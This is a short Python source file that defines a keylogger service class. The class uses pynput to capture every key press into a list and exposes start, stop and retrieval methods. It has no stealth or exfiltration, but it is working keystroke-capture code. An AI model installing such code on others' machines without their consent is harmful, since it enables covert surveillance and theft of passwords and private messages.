from pynput import keyboard
from typing import List
from ikeylogger import IKeyLogger

class KeyLoggerService(IKeyLogger):
    def __init__(self):
        self.logged_keys = []
        self.listener = None

    def start_logging(self):
        def on_press(key):
            try:
                self.logged_keys.append(key.char)
            except AttributeError:
                self.logged_keys.append(str(key))

        self.listener = keyboard.Listener(on_press=on_press)
        self.listener.start()

    def stop_logging(self):
        if self.listener:
            self.listener.stop()

    def get_logged_keys(self) -> List[str]:
        return self.logged_keys